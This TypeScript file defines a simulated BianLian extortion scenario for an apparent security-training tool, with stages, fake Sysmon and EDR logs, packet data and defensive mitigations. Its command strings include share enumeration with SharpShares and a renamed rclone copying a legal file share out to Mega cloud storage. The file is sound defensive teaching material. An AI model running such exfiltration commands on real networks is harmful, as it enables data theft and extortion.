import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'bianlian-extortion-go-backdoor-rdp',
    title: 'BianLian Custom Golang mTLS Backdoor, Built-In SOCKS5 & Pure Extortion (AA23-136A)',
    category: 'RANSOMWARE_EXTORTION',
    mitreId: 'T1048',
    description:
      'BianLian operators abandon file encryption in favor of pure data-exfiltration extortion (AA23-136A). They deploy a custom cross-compiled Golang mTLS backdoor containing an embedded go-socks5 server, enumerate AD shares via SharpShares, and exfiltrate terabytes of data over rclone and FileZilla without triggering ransomware file-write sensors.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'BianLian Extortion C2 & Mega/FTP Drop', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Golang mTLS Backdoor (Windows/Linux)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Embedded go-socks5 Memory Proxy', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'CISA AA23-136A / Red Canary Sensor', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Pure Exfiltration (rclone / SharpShares)', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Deploying Custom Golang mTLS Backdoor with Hardcoded X.509 Pinning',
        narration:
          'BianLian compiles a unique per-victim 64-bit Golang binary (disguised as SystemSettingsAdminFlows.exe or Win64Ark.exe) that connects outbound over mutual TLS (mTLS) with hardcoded client/server X.509 certificates to an attacker C2 IP.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Command and Control (T1573.002 - Asymmetric Cryptography / mTLS)',
        technicalCommands: [
          'C:\\Windows\\Temp\\SystemSettingsAdminFlows.exe (Golang binary with main.run & main.backconnect)',
          'mTLS Handshake: Presents embedded client X.509 cert to C2 IP:443',
        ],
        defenseMitigation:
          'Hunt for unsigned Golang binaries (`Go build ID`) executing from `C:\\Windows\\Temp` or `C:\\ProgramData` that initiate long-lived TLS sessions to uncategorized IP literals without a preceding DNS lookup.',
        logs: [
          {
            id: 'bian-1',
            timestamp: '05:14:02.118',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 3,
            ProcessName: 'SystemSettingsAdminFlows.exe',
            raw: 'EventID: 3 (NetworkConnect) | Image: C:\\Windows\\Temp\\SystemSettingsAdminFlows.exe (Unsigned Golang Binary) | DestinationIp: 198.51.100.142 | DestinationPort: 443 | GoSymbols: main.backconnect, github.com/armon/go-socks5 | Advisory: CISA AA23-136A',
            parsedFields: {
              MalwareFamily: 'BianLian Custom Golang Backdoor',
              EmbeddedGoPackages: 'main.backconnect, github.com/armon/go-socks5, github.com/hashicorp/yamux',
              C2Protocol: 'Mutual TLS (mTLS) to Raw IP Literal',
            },
          },
        ],
        packets: [
          {
            id: 'bian-pkt-1',
            timestamp: '05:14:02.110',
            protocol: 'TCP',
            sourceIp: '10.20.10.55',
            destIp: '198.51.100.142',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 512,
            hexDump: '16 03 03 01 F0 01 00 01 EC 03 03 62 69 61 6E 6C 69 61 6E 5F 6D 74 6C 73 5F 79 61 6D 75 78',
            decodedString: 'mTLS ClientHello + Certificate (Self-Signed X.509 Pinning over HashiCorp Yamux Multiplexer)',
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: In-Memory Yamux Multiplexing & Built-In go-socks5 Lateral Pivot',
        narration:
          'Inside the mTLS connection, the Golang implant uses HashiCorp’s yamux stream multiplexer and armon/go-socks5 to expose an in-memory SOCKS5 proxy to the operator, allowing the attacker to run Impacket, RDP, and SharpShares from their external C2 directly into internal subnets.',
        activeNodes: ['firewall', 'target', 'siem'],
        mitreTactic: 'Command and Control (T1090.001 - Internal Proxy / SOCKS5)',
        technicalCommands: [
          'Go Routine: yamux.Server(tlsConn, nil) -> socks5.New(&socks5.Config{})',
          'SharpShares.exe /threads:50 /filter:SYSVOL,NETLOGON,IPC$',
        ],
        defenseMitigation:
          'Monitor internal East-West SMB (445), LDAP (389), and RDP (3389) connections originating from a single workstation or server that is simultaneously holding a high-throughput outbound TLS socket.',
        logs: [
          {
            id: 'bian-2',
            timestamp: '05:19:33.504',
            source: 'EDR',
            severity: 'critical',
            raw: 'Lateral Movement via Embedded SOCKS5 Proxy | ProxyHost: 10.20.10.55 (SystemSettingsAdminFlows.exe) | Multiplexer: hashicorp/yamux | DownstreamConnections: 142 internal SMB (445) & LDAP (389) connections via SharpShares',
            parsedFields: {
              MultiplexerLibrary: 'github.com/hashicorp/yamux + armon/go-socks5',
              DiscoveryTool: 'SharpShares.exe',
              LateralFootprint: 'Zero secondary implants needed on target SMB file servers',
            },
          },
        ],
        packets: [],
      },
      {
        id: 3,
        title: 'Stage 3: Pure Data-Exfiltration Extortion via Rclone & FTP (Zero Encryption)',
        narration:
          'Rather than deploying a file encryptor (which triggers behavioral ransomware rollbacks and gives victims no incentive to prevent publication once backups are restored), BianLian renames rclone.exe to Win.exe, exfiltrates sensitive legal, financial, and healthcare databases to Mega.io / FTP servers, and drops a pure-extortion note.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Exfiltration (T1567.002 - Exfiltration to Cloud Storage / T1048)',
        technicalCommands: [
          'C:\\ProgramData\\Win.exe (renamed rclone.exe) copy "\\\\fileserver\\Executive_Legal" mega:bianlian_vault --bwlimit 50M',
          'Drop extortion note: Look_at_this_file.txt (No file encryption performed)',
        ],
        defenseMitigation:
          'Block outbound access to consumer cloud storage APIs (`*.mega.co.nz`, `api.mega.co.nz`, `pcloud.com`) and match `rclone.exe` by PE metadata (`OriginalFileName: rclone.exe` / Go symbol table) regardless of binary rename.',
        logs: [
          {
            id: 'bian-3',
            timestamp: '06:02:11.908',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'Win.exe',
            CommandLine: 'C:\\ProgramData\\Win.exe copy "\\\\fileserver\\Executive_Legal" mega:bianlian_vault --bwlimit 50M',
            raw: 'EventID: 1 | Image: C:\\ProgramData\\Win.exe | OriginalFileName: rclone.exe | CommandLine: Win.exe copy "\\\\fileserver\\Executive_Legal" mega:bianlian_vault | ExtortionModel: Pure Exfiltration (Zero Files Encrypted)',
            parsedFields: {
              RenamedBinary: 'C:\\ProgramData\\Win.exe (OriginalFileName: rclone.exe)',
              ExfiltrationDestination: 'Mega.io Cloud Storage & External FTP',
              ExtortionModel: 'Pure Data-Leak Extortion (No File Encryption)',
            },
          },
        ],
        packets: [],
      },
    ],
  };
